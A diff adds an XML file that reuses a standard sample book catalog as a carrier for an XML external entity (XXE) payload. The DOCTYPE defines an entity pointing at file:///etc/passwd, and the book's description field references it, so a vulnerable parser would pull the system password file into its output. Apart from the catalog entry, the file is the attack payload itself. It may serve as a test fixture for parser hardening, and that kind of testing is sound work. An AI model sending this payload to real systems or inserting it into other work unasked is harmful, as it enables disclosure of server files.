@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<catalog>
+    <book id="bk101">
+        <author>Gambardella, Matthew</author>
+        <title>XML Developer's Guide</title>
+        <genre>Computer</genre>
+        <price>44.95</price>
+        <publish_date>2000-10-01</publish_date>
+        <description>&xxe;</description>
+    </book>
+</catalog>
